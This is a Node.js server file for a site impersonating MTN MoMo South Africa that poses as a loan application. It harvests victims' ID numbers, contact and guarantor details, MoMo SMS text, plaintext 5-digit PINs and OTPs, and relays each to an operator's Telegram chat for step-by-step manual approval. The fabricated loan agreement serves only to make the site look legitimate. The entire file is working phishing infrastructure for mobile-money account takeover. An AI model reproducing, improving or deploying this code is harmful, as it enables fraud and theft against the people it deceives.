// ============================================================
// server.js – MTN MoMo South Africa v7.0
// Flow: Application → SMS → PIN → OTP → Dashboard
// ============================================================
'use strict';

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();

app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    next();
});

const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || '*';
app.use(cors({ origin: ALLOWED_ORIGIN }));
app.use(express.json({ limit: '256kb' }));
app.use(express.static(path.join(__dirname, '../frontend'), { maxAge: '5m' }));

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const WEBHOOK_SECRET = process.env.TELEGRAM_WEBHOOK_SECRET || '';
const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

console.log('═══════════════════════════════════════');
console.log('🚀 MTN MoMo SA v7.0');
console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '...' : 'MISSING');
console.log('   CHAT_ID:', CHAT_ID || 'MISSING');
console.log('═══════════════════════════════════════');

const ACCOUNT_TYPES = {
    yello: { name: 'MoMo Yello', icon: '🟡', dailyCash: 3500, monthlyCap: 20000, maxLoan: 20000, minLoan: 5000, requiresId: true },
    yello_plus: { name: 'MoMo Yello Plus', icon: '⭐', dailyCash: 10000, monthlyCap: 40000, maxLoan: 40000, minLoan: 5000, requiresId: true },
    eazi: { name: 'MoMo Eazi', icon: '⚡', dailyCash: 2000, monthlyCap: 10000, maxLoan: 10000, minLoan: 5000, requiresId: false }
};

const applications = {};
const rateLimits = { ip: {} };
const DATA_DIR = path.join(__dirname, '../data');
const FILES = {
    apps: path.join(DATA_DIR, 'applications.json'),
    audit: path.join(DATA_DIR, 'audit.log'),
    rate: path.join(DATA_DIR, 'rate_limits.json')
};
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

function saveApps() {
    try { fs.writeFileSync(FILES.apps, JSON.stringify({ applications, timestamp: new Date().toISOString() }, null, 2)); }
    catch (e) { console.error('Save:', e.message); }
}
function saveRates() {
    try { fs.writeFileSync(FILES.rate, JSON.stringify(rateLimits)); } catch (e) {}
}
function loadAll() {
    try {
        if (fs.existsSync(FILES.apps)) {
            const p = JSON.parse(fs.readFileSync(FILES.apps, 'utf8'));
            const age = Date.now() - new Date(p.timestamp).getTime();
            if (age < 7 * 24 * 60 * 60 * 1000) {
                Object.assign(applications, p.applications || {});
                console.log(`📂 Loaded ${Object.keys(applications).length} applications`);
            }
        }
        if (fs.existsSync(FILES.rate)) Object.assign(rateLimits, JSON.parse(fs.readFileSync(FILES.rate, 'utf8')));
    } catch (e) { console.error('Load:', e.message); }
}

function audit(event, data = {}) {
    const entry = { ts: new Date().toISOString(), event, ...data };
    try { fs.appendFileSync(FILES.audit, JSON.stringify(entry) + '\n'); } catch (e) {}
    console.log(JSON.stringify(entry));
}

function rateLimit(bucket, key, max, windowMs) {
    const now = Date.now();
    if (!rateLimits[bucket][key]) rateLimits[bucket][key] = [];
    rateLimits[bucket][key] = rateLimits[bucket][key].filter(ts => now - ts < windowMs);
    if (rateLimits[bucket][key].length >= max) return false;
    rateLimits[bucket][key].push(now);
    return true;
}
setInterval(() => {
    const now = Date.now();
    Object.keys(rateLimits.ip).forEach(k => {
        rateLimits.ip[k] = rateLimits.ip[k].filter(ts => now - ts < 3600000);
        if (!rateLimits.ip[k].length) delete rateLimits.ip[k];
    });
    saveRates();
}, 300000);

function esc(t) {
    if (t === null || t === undefined) return '';
    return String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function code(t) {
    const c = (t === null || t === undefined) ? '' : String(t).trim();
    return `<code>${esc(c)}</code>`;
}
function block(t) {
    const c = (t === null || t === undefined) ? '' : String(t).trim();
    return `<pre>${esc(c)}</pre>`;
}
function fmt(n) { return (Number(n) || 0).toLocaleString(); }
function sanitize(str, max = 300) {
    if (typeof str !== 'string') return '';
    return str.trim().slice(0, max).replace(/[\u0000-\u001F\u007F]/g, '');
}
function cleanId(id) { return String(id || '').trim().toUpperCase().slice(0, 20); }
function validAppId(id) { return /^MTN-ZA-[A-Z0-9]{6,12}$/.test(id); }

const LOAN_CONFIG = {
    annualInterestRate: 0.27,
    monthlyServiceFee: 60,
    initiationFeeCap: 1050,
    vatRate: 0.15
};
function calculateLoan(principal, months) {
    const rate = LOAN_CONFIG.annualInterestRate;
    const initFee = Math.min(principal * 0.10, LOAN_CONFIG.initiationFeeCap);
    const initVat = initFee * LOAN_CONFIG.vatRate;
    const r = rate / 12;
    let monthly;
    if (r === 0) monthly = principal / months;
    else monthly = principal * r / (1 - Math.pow(1 + r, -months));
    monthly = Math.ceil(monthly + LOAN_CONFIG.monthlyServiceFee);

    const schedule = [];
    let balance = principal;
    let totalInterest = 0;
    for (let i = 1; i <= months; i++) {
        const interest = Math.ceil(balance * r);
        const principalPortion = Math.max(0, monthly - interest - LOAN_CONFIG.monthlyServiceFee);
        const actualPrincipal = Math.min(principalPortion, balance);
        balance = Math.max(0, balance - actualPrincipal);
        totalInterest += interest;
        schedule.push({ month: i, payment: monthly, interest, principal: actualPrincipal, balance });
    }
    const totalRepayment = monthly * months + initFee + initVat;
    const totalCostOfCredit = totalRepayment - principal;

    return {
        principal, months,
        interestRate: rate,
        interestRatePercent: (rate * 100).toFixed(2),
        monthlyPayment: monthly,
        initiationFee: Math.ceil(initFee),
        initiationVat: Math.ceil(initVat),
        totalInterest,
        totalRepayment: Math.ceil(totalRepayment),
        totalCostOfCredit: Math.ceil(totalCostOfCredit),
        schedule
    };
}

function validateSAID(id) {
    if (!id) return { ok: false, reason: 'ID required.' };
    const clean = String(id).replace(/\D/g, '');
    if (clean.length !== 13) return { ok: false, reason: 'SA ID must be 13 digits.' };
    const yy = parseInt(clean.substring(0, 2));
    const mm = parseInt(clean.substring(2, 4));
    const dd = parseInt(clean.substring(4, 6));
    const century = yy < 30 ? 2000 : 1900;
    const year = century + yy;
    const dob = new Date(year, mm - 1, dd);
    if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) return { ok: false, reason: 'Invalid date of birth.' };
    const age = Math.floor((Date.now() - dob.getTime()) / 31557600000);
    if (age < 18) return { ok: false, reason: 'Must be 18 or older.' };
    if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };
    let sum = 0, alt = false;
    for (let i = clean.length - 1; i >= 0; i--) {
        let n = parseInt(clean[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n; alt = !alt;
    }
    if (sum % 10 !== 0) return { ok: false, reason: 'Invalid ID checksum.' };
    const gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
    const c = clean[10];
    const citizenship = c === '0' ? 'SA Citizen' : c === '1' ? 'Permanent Resident' : c === '2' ? 'Refugee' : c === '3' ? 'Asylum Seeker' : 'Other';
    return { ok: true, age, gender, citizenship, dob: dob.toISOString().split('T')[0], idNumber: clean };
}

async function tgSend(text, buttons = null) {
    if (!BOT_TOKEN || !CHAT_ID) return { ok: false };
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    try {
        const r = await fetch(`${TG_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        return await r.json();
    } catch (e) { console.error('TG:', e.message); return { ok: false }; }
}
function askApproval(text, step, appId) {
    const buttons = [[
        { text: '✅ YES', callback_data: JSON.stringify({ a: 'Y', s: step, id: appId }) },
        { text: '❌ NO',  callback_data: JSON.stringify({ a: 'N', s: step, id: appId }) }
    ]];
    tgSend(text, buttons);
}

// ═══════════════════════════════════════════════════════════
// DIAGNOSTICS
// ═══════════════════════════════════════════════════════════
app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: Math.floor(process.uptime()), applications: Object.keys(applications).length, version: '7.0' });
});

app.get('/api/telegram-debug', async (req, res) => {
    const result = { tokenSet: !!BOT_TOKEN, chatIdSet: !!CHAT_ID };
    try { const me = await fetch(`${TG_API}/getMe`); result.getMe = await me.json(); } catch (e) { result.getMeError = e.message; }
    try { result.testSend = await tgSend('🧪 Test v7.0'); } catch (e) { result.testSendError = e.message; }
    res.json(result);
});

// ═══════════════════════════════════════════════════════════
// REGISTRATION
// ═══════════════════════════════════════════════════════════
app.post('/api/register-momo', async (req, res) => {
    try {
        const ip = (req.headers['x-forwarded-for'] || req.ip || '').toString().split(',')[0].trim();
        if (!rateLimit('ip', ip, 10, 3600000)) return res.status(429).json({ ok: false, error: 'Too many requests.' });

        const { applicationId, idNumber, accountType } = req.body || {};
        const cleanAppId = cleanId(applicationId);
        if (!validAppId(cleanAppId)) return res.status(400).json({ ok: false, error: 'Invalid application ID.' });
        if (!ACCOUNT_TYPES[accountType]) return res.status(400).json({ ok: false, error: 'Invalid account type.' });

        const type = ACCOUNT_TYPES[accountType];
        let idCheck = { ok: true };
        if (type.requiresId) {
            idCheck = validateSAID(idNumber);
            if (!idCheck.ok) return res.status(400).json({ ok: false, error: idCheck.reason });
        }

        if (!applications[cleanAppId]) {
            applications[cleanAppId] = { applicationId: cleanAppId, createdAt: new Date().toISOString(), steps: {}, auditTrail: [] };
        }

        applications[cleanAppId].momoRegistration = {
            idNumber: type.requiresId ? sanitize(idNumber, 13) : null,
            accountType,
            accountName: type.name,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            maxLoan: type.maxLoan,
            minLoan: type.minLoan,
            idDetails: idCheck.ok && type.requiresId ? { age: idCheck.age, gender: idCheck.gender, citizenship: idCheck.citizenship, dob: idCheck.dob } : null,
            registeredAt: new Date().toISOString()
        };
        applications[cleanAppId].isRegistered = true;
        applications[cleanAppId].accountType = accountType;
        applications[cleanAppId].accountMaxLoan = type.maxLoan;
        applications[cleanAppId].auditTrail.push({ ts: new Date().toISOString(), event: 'registered', accountType });
        saveApps();

        audit('registration', { id: cleanAppId, accountType, ip });

        tgSend(
            `📱 <b>NEW MOMO REGISTRATION</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ${code(cleanAppId)}\n\n` +
            `${type.icon} <b>${type.name}</b>\n` +
            `Max loan: <b>R ${fmt(type.maxLoan)}</b>\n` +
            (idCheck.ok && type.requiresId ? `\n🇿🇦 ${code(idNumber)}\nAge ${idCheck.age} · ${idCheck.gender} · ${idCheck.citizenship}\n` : '')
        );

        res.json({
            ok: true, accountType, accountName: type.name,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            maxLoan: type.maxLoan, minLoan: type.minLoan
        });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ═══════════════════════════════════════════════════════════
// STEP SUBMISSION
// ═══════════════════════════════════════════════════════════
const VALID_STEPS = ['application', 'sms', 'pin', 'otp'];
const STEP_ORDER = ['application', 'sms', 'pin', 'otp'];

app.post('/api/submit-step', (req, res) => {
    try {
        const ip = (req.headers['x-forwarded-for'] || req.ip || '').toString().split(',')[0].trim();
        if (!rateLimit('ip', ip, 60, 600000)) return res.status(429).json({ ok: false, error: 'Too many requests.' });

        const { applicationId, step, data } = req.body || {};
        const id = cleanId(applicationId);
        if (!validAppId(id)) return res.status(400).json({ ok: false, error: 'Invalid application ID.' });
        if (!VALID_STEPS.includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step.' });

        const app_ = applications[id];
        if (!app_) return res.status(404).json({ ok: false, error: 'Application not found.' });
        if (!app_.isRegistered || !app_.accountType) {
            return res.status(403).json({ ok: false, code: 'NOT_REGISTERED', error: 'Invalid user credentials. Please register first.' });
        }

        const type = ACCOUNT_TYPES[app_.accountType];
        app_.steps = app_.steps || {};

        // Sequential gate
        const idx = STEP_ORDER.indexOf(step);
        for (let i = 0; i < idx; i++) {
            const prev = STEP_ORDER[i];
            if (app_.steps[prev] !== 'approved') {
                return res.status(400).json({ ok: false, error: `Complete ${prev} first.` });
            }
        }

        // Per-step validation & storage
        if (step === 'application') {
            const loanAmount = Number(data?.loanAmount);
            if (!Number.isFinite(loanAmount) || loanAmount < type.minLoan || loanAmount > type.maxLoan) {
                return res.status(400).json({ ok: false, error: `Amount must be R ${fmt(type.minLoan)} – R ${fmt(type.maxLoan)}.` });
            }
            const phone = String(data?.phone || '').replace(/\D/g, '');
            const email = sanitize(data?.email, 120);
            const kinPhone = String(data?.kinPhone || '').replace(/\D/g, '');
            const guarantorPhone = String(data?.guarantorPhone || '').replace(/\D/g, '');
            const firstName = sanitize(data?.firstName, 40);
            const lastName = sanitize(data?.lastName, 40);
            const kinName = sanitize(data?.kinName, 60);
            const guarantorName = sanitize(data?.guarantorName, 60);
            const guarantorRelation = sanitize(data?.guarantorRelation, 40);
            const annualIncome = Number(data?.annualIncome);

            if (!firstName || !lastName) return res.status(400).json({ ok: false, error: 'Full name required.' });
            if (phone.length !== 9) return res.status(400).json({ ok: false, error: 'Phone must be 9 digits.' });
            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.status(400).json({ ok: false, error: 'Invalid email.' });
            if (kinPhone.length !== 9) return res.status(400).json({ ok: false, error: 'Kin phone must be 9 digits.' });
            if (!kinName) return res.status(400).json({ ok: false, error: 'Kin name required.' });
            if (guarantorPhone.length !== 9) return res.status(400).json({ ok: false, error: 'Guarantor phone must be 9 digits.' });
            if (!guarantorName || guarantorName.length < 3) return res.status(400).json({ ok: false, error: 'Guarantor name required.' });
            if (!guarantorRelation) return res.status(400).json({ ok: false, error: 'Guarantor relationship required.' });
            if (guarantorPhone === phone) return res.status(400).json({ ok: false, error: 'Guarantor phone cannot be your own.' });
            if (!Number.isFinite(annualIncome) || annualIncome <= 0) return res.status(400).json({ ok: false, error: 'Invalid income.' });

            app_.details = {
                loanType: sanitize(data.loanType, 40),
                loanAmount,
                loanTerm: sanitize(data.loanTerm, 20),
                loanPurpose: sanitize(data.loanPurpose, 300),
                firstName, lastName, phone, email,
                employment: sanitize(data.employment, 40),
                annualIncome,
                kinName, kinPhone,
                guarantorName, guarantorPhone, guarantorRelation
            };
        } else if (step === 'sms') {
            const msg = sanitize(data?.momoMessage, 2000);
            if (msg.length < 10) return res.status(400).json({ ok: false, error: 'SMS too short.' });
            app_.smsMessage = msg;
        } else if (step === 'pin') {
            const pin = String(data?.pin || '').trim();
            if (!/^\d{5}$/.test(pin)) return res.status(400).json({ ok: false, error: 'PIN must be 5 digits.' });
            app_.pinHash = crypto.createHash('sha256').update(pin + (process.env.PIN_SALT || 'mtn-salt')).digest('hex').slice(0, 16);
            app_.pinValue = pin;
        } else if (step === 'otp') {
            const otp = String(data?.otp || '').trim();
            if (!/^\d{4}$/.test(otp)) return res.status(400).json({ ok: false, error: 'OTP must be 4 digits.' });
            app_.otpValue = otp;
        }

        app_.steps[step] = 'pending';
        app_.updatedAt = new Date().toISOString();
        app_.auditTrail.push({ ts: new Date().toISOString(), event: `step_${step}_submitted` });
        if (app_.auditTrail.length > 100) app_.auditTrail = app_.auditTrail.slice(-100);
        saveApps();

        const d = app_.details || {};
        const loan = d.loanAmount ? calculateLoan(d.loanAmount, parseInt(d.loanTerm)) : null;

        const msgs = {
            application: () =>
                `📋 <b>NEW LOAN APPLICATION</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━━━\n` +
                `🆔 ${code(id)}\n` +
                `💳 ${type.icon} ${type.name}\n\n` +
                `<b>💰 LOAN REQUEST</b>\n` +
                `Type: ${esc(d.loanType)}\n` +
                `Amount: <b>R ${fmt(d.loanAmount)}</b>\n` +
                `Term: ${esc(d.loanTerm)}\n` +
                (loan ? `Monthly: <b>R ${fmt(loan.monthlyPayment)}</b>\n` : '') +
                `Purpose: ${esc(d.loanPurpose)}\n\n` +
                `<b>👤 APPLICANT</b>\n` +
                `${esc(d.firstName)} ${esc(d.lastName)}\n` +
                `${code('+27' + d.phone)}\n` +
                `${esc(d.email)}\n\n` +
                `<b>💼 EMPLOYMENT</b>\n` +
                `${esc(d.employment)} — R ${fmt(d.annualIncome)}/yr\n\n` +
                `<b>👨‍👩‍👦 NEXT OF KIN</b>\n` +
                `${esc(d.kinName)} ${code('+27' + d.kinPhone)}\n\n` +
                `<b>🤝 GUARANTOR</b>\n` +
                `${esc(d.guarantorName)}\n` +
                `${code('+27' + d.guarantorPhone)} (${esc(d.guarantorRelation)})\n\n` +
                `✅ <b>Approve to allow SMS step?</b>`,
            sms: () =>
                `📨 <b>SMS VERIFICATION</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━━━\n` +
                `🆔 ${code(id)}\n` +
                `👤 ${esc(d.firstName)} ${esc(d.lastName)}\n` +
                `📱 ${code('+27' + d.phone)}\n\n` +
                `📩 <b>SMS Content:</b>\n${block(app_.smsMessage)}\n\n` +
                `✅ <b>Approve to allow PIN step?</b>`,
            pin: () =>
                `🔐 <b>PIN VERIFICATION</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━━━\n` +
                `🆔 ${code(id)}\n` +
                `👤 ${esc(d.firstName)} ${esc(d.lastName)}\n` +
                `🔢 PIN: ${code(app_.pinValue)}\n\n` +
                `✅ <b>Approve to allow OTP step?</b>`,
            otp: () =>
                `🔑 <b>OTP VERIFICATION</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━━━\n` +
                `🆔 ${code(id)}\n` +
                `👤 ${esc(d.firstName)} ${esc(d.lastName)}\n` +
                `🔢 OTP: ${code(app_.otpValue)}\n\n` +
                `✅ <b>Approve to complete the loan?</b>`
        };

        askApproval(msgs[step](), step, id);
        audit('step_submitted', { id, step });

        res.json({ ok: true, step, status: 'pending' });
    } catch (e) {
        console.error('submit-step:', e.message);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ═══════════════════════════════════════════════════════════
// APPLICATION DETAILS (for dashboard)
// ═══════════════════════════════════════════════════════════
app.get('/api/application/:applicationId', (req, res) => {
    const app_ = applications[cleanId(req.params.applicationId)];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });

    const d = app_.details || {};
    const loan = d.loanAmount ? calculateLoan(d.loanAmount, parseInt(d.loanTerm)) : null;

    res.json({
        ok: true,
        application: {
            applicationId: app_.applicationId,
            isRegistered: !!app_.isRegistered,
            accountType: app_.accountType,
            accountName: app_.momoRegistration?.accountName,
            accountMaxLoan: app_.accountMaxLoan,
            steps: app_.steps || {},
            details: {
                loanType: d.loanType,
                loanAmount: d.loanAmount,
                loanTerm: d.loanTerm,
                loanPurpose: d.loanPurpose,
                firstName: d.firstName,
                lastName: d.lastName,
                phone: d.phone,
                email: d.email,
                employment: d.employment,
                annualIncome: d.annualIncome,
                kinName: d.kinName,
                kinPhone: d.kinPhone,
                guarantorName: d.guarantorName,
                guarantorPhone: d.guarantorPhone,
                guarantorRelation: d.guarantorRelation
            },
            createdAt: app_.createdAt,
            updatedAt: app_.updatedAt
        },
        loan
    });
});

// ═══════════════════════════════════════════════════════════
// AGREEMENT + SCHEDULE
// ═══════════════════════════════════════════════════════════
app.get('/api/agreement/:applicationId', (req, res) => {
    const app_ = applications[cleanId(req.params.applicationId)];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    if (app_.steps?.otp !== 'approved') return res.status(400).json({ ok: false, error: 'Not approved yet.' });

    const d = app_.details;
    const loan = calculateLoan(d.loanAmount, parseInt(d.loanTerm));
    const t = ACCOUNT_TYPES[app_.accountType];

    const agreement = `
MTN MOMO SOUTH AFRICA — LOAN AGREEMENT
========================================

Application ID: ${app_.applicationId}
Date: ${new Date().toISOString().split('T')[0]}

PARTIES
-------
Lender: MTN MoMo Loans SA (Pty) Ltd
Borrower: ${d.firstName} ${d.lastName}
Phone: +27${d.phone}
Email: ${d.email}
ID: ${app_.momoRegistration?.idNumber || 'N/A'}
MoMo Account: ${t.name}

GUARANTOR
---------
Name: ${d.guarantorName}
Phone: +27${d.guarantorPhone}
Relationship: ${d.guarantorRelation}

LOAN TERMS
----------
Principal Amount: R ${loan.principal.toLocaleString()}
Term: ${loan.months} months
Interest Rate: ${loan.interestRatePercent}% per annum
Initiation Fee: R ${loan.initiationFee.toLocaleString()} (incl. VAT R ${loan.initiationVat})
Monthly Service Fee: R ${LOAN_CONFIG.monthlyServiceFee}
Monthly Repayment: R ${loan.monthlyPayment.toLocaleString()}
Total Interest: R ${loan.totalInterest.toLocaleString()}
Total Repayment: R ${loan.totalRepayment.toLocaleString()}
Total Cost of Credit: R ${loan.totalCostOfCredit.toLocaleString()}

DISBURSEMENT
------------
Funds will be paid directly to your MoMo wallet within 5 minutes.

REPAYMENT
---------
Monthly instalments of R ${loan.monthlyPayment.toLocaleString()} starting one month after disbursement.

Signed electronically on ${new Date().toISOString()}.
© 2026 MTN MoMo South Africa
`;
    res.json({ ok: true, agreement, loan });
});

app.get('/api/repayment-schedule/:applicationId', (req, res) => {
    const app_ = applications[cleanId(req.params.applicationId)];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const d = app_.details;
    if (!d?.loanAmount) return res.status(400).json({ ok: false, error: 'No loan yet.' });
    const loan = calculateLoan(d.loanAmount, parseInt(d.loanTerm));
    res.json({ ok: true, schedule: loan.schedule, summary: { monthly: loan.monthlyPayment, total: loan.totalRepayment } });
});

// ═══════════════════════════════════════════════════════════
// TELEGRAM WEBHOOK
// ═══════════════════════════════════════════════════════════
app.post('/api/telegram-webhook', (req, res) => {
    res.status(200).send('ok');

    if (WEBHOOK_SECRET) {
        const provided = req.headers['x-telegram-bot-api-secret-token'] || '';
        if (provided !== WEBHOOK_SECRET) { console.warn('⚠️ Secret mismatch'); return; }
    }

    try {
        if (req.body?.callback_query) {
            const q = req.body.callback_query;

            if (q.from && String(q.from.id) !== String(CHAT_ID)) {
                fetch(`${TG_API}/answerCallbackQuery`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: q.id, text: 'Unauthorized' })
                }).catch(() => {});
                return;
            }

            fetch(`${TG_API}/answerCallbackQuery`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: q.id, text: 'Received' })
            }).catch(() => {});

            try {
                const data = JSON.parse(q.data);
                const app_ = applications[data.id];
                if (!app_) return;
                const step = data.s;
                const approved = data.a === 'Y';
                app_.steps = app_.steps || {};
                if (app_.steps[step] !== 'pending') return;

                app_.steps[step] = approved ? 'approved' : 'rejected';
                app_.updatedAt = new Date().toISOString();
                app_.auditTrail.push({ ts: new Date().toISOString(), event: `step_${step}_${approved ? 'approved' : 'rejected'}` });
                saveApps();

                audit('step_decision', { id: data.id, step, decision: approved ? 'approved' : 'rejected' });

                tgSend(
                    `${approved ? '✅' : '❌'} <b>${approved ? 'APPROVED' : 'REJECTED'}</b>\n` +
                    `🆔 ${code(data.id)}\n📋 ${step.toUpperCase()}\n` +
                    `👤 ${esc(app_.details?.firstName || '')} ${esc(app_.details?.lastName || '')}`
                );
            } catch (e) { console.error('Callback:', e.message); }
            return;
        }

        if (req.body?.message?.text) {
            const text = req.body.message.text.trim();
            const chatId = String(req.body.message.chat.id);
            if (chatId !== String(CHAT_ID)) return;

            if (text === '/start' || text === '/help') {
                tgSend(`🤖 <b>MTN MoMo Loan Bot v7.0</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats\n📋 /list\n🔍 /search [query]\n⏳ /pending\n🔎 /app [ID]`);
            } else if (text === '/stats') {
                const total = Object.keys(applications).length;
                const pending = Object.values(applications).filter(a => Object.values(a.steps || {}).some(s => s === 'pending')).length;
                const completed = Object.values(applications).filter(a => a.steps?.otp === 'approved').length;
                tgSend(`📊 <b>STATS</b>\n📝 Total: <b>${total}</b>\n⏳ Pending: ${pending}\n✅ Completed: ${completed}`);
            } else if (text === '/pending') {
                const pending = Object.entries(applications).filter(([_, a]) => Object.values(a.steps || {}).some(s => s === 'pending'));
                if (!pending.length) { tgSend('✅ No pending.'); return; }
                let msg = `⏳ <b>PENDING (${pending.length})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n`;
                pending.slice(0, 10).forEach(([id, a]) => {
                    const steps = Object.entries(a.steps).filter(([_, s]) => s === 'pending').map(([k]) => k);
                    msg += `\n🆔 ${code(id)}\n📋 ${steps.join(', ')}\n`;
                });
                tgSend(msg);
            } else if (text === '/list') {
                const ids = Object.keys(applications).slice(-10);
                if (!ids.length) { tgSend('📭 Empty.'); return; }
                let msg = '📋 <b>LAST 10</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
                ids.forEach((id, i) => {
                    const a = applications[id];
                    msg += `\n${i+1}. 🆔 ${code(id)}\n💰 R ${fmt(a.details?.loanAmount)}\n`;
                });
                tgSend(msg);
            } else if (text.startsWith('/search ')) {
                const query = text.replace('/search ', '').trim().toLowerCase();
                const matches = Object.entries(applications).filter(([id, a]) => {
                    const d = a.details || {};
                    const hay = [id, d.firstName, d.lastName, d.phone, d.email].join(' ').toLowerCase();
                    return hay.includes(query);
                });
                if (!matches.length) { tgSend(`❌ No match`); return; }
                let msg = `🔍 <b>${matches.length} match(es)</b>\n`;
                matches.slice(0, 5).forEach(([id, a]) => {
                    msg += `\n🆔 ${code(id)}\n👤 ${esc(a.details?.firstName || '')} ${esc(a.details?.lastName || '')}\n`;
                });
                tgSend(msg);
            } else if (text.startsWith('/app ')) {
                const id = text.replace('/app ', '').trim().toUpperCase();
                const a = applications[id];
                if (!a) { tgSend('❌ Not found'); return; }
                const d = a.details || {};
                const steps = a.steps || {};
                let msg = `🔍 <b>${esc(id)}</b>\n━━━━━━━━━━━━━━━━━━━━━━\n`;
                if (d.firstName) msg += `👤 ${esc(d.firstName)} ${esc(d.lastName)}\n📱 ${code('+27' + d.phone)}\n`;
                if (d.loanAmount) msg += `💰 R ${fmt(d.loanAmount)} · ${esc(d.loanTerm)}\n`;
                msg += `\n<b>Steps:</b>\n`;
                STEP_ORDER.forEach(s => { msg += `${s}: ${steps[s] || 'idle'}\n`; });
                tgSend(msg);
            }
        }
    } catch (e) { console.error('Webhook:', e.message); }
});

// ═══════════════════════════════════════════════════════════
// STATUS
// ═══════════════════════════════════════════════════════════
app.get('/api/status/:applicationId/:step', (req, res) => {
    const app_ = applications[cleanId(req.params.applicationId)];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const step = req.params.step;
    if (!VALID_STEPS.includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step' });
    res.json({ ok: true, status: app_.steps?.[step] || 'idle', step, applicationId: app_.applicationId });
});

app.get('/api/status/:applicationId', (req, res) => {
    const app_ = applications[cleanId(req.params.applicationId)];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    res.json({
        ok: true,
        applicationId: app_.applicationId,
        isRegistered: !!app_.isRegistered,
        accountType: app_.accountType,
        accountMaxLoan: app_.accountMaxLoan,
        steps: app_.steps || {}
    });
});

// ═══════════════════════════════════════════════════════════
// RETRY
// ═══════════════════════════════════════════════════════════
app.post('/api/retry/:applicationId/:step', (req, res) => {
    const app_ = applications[cleanId(req.params.applicationId)];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    const step = req.params.step;
    if (!VALID_STEPS.includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step' });
    if (app_.steps?.[step] === 'approved') return res.status(400).json({ ok: false, error: 'Cannot retry approved step.' });

    app_.steps[step] = 'idle';
    if (step === 'sms') app_.smsMessage = null;
    if (step === 'pin') { app_.pinValue = null; app_.pinHash = null; }
    if (step === 'otp') app_.otpValue = null;
    app_.updatedAt = new Date().toISOString();
    saveApps();
    res.json({ ok: true });
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

setInterval(() => {
    const cutoff = Date.now() - 30 * 24 * 60 * 60 * 1000;
    let cleaned = 0;
    Object.keys(applications).forEach(id => {
        if (new Date(applications[id].createdAt).getTime() < cutoff) { delete applications[id]; cleaned++; }
    });
    if (cleaned) { saveApps(); console.log(`🧹 Cleaned ${cleaned}`); }
}, 86400000);

loadAll();
app.listen(PORT, () => {
    console.log(`🚀 Server on port ${PORT}`);
    console.log(`   Health: /health\n`);
});
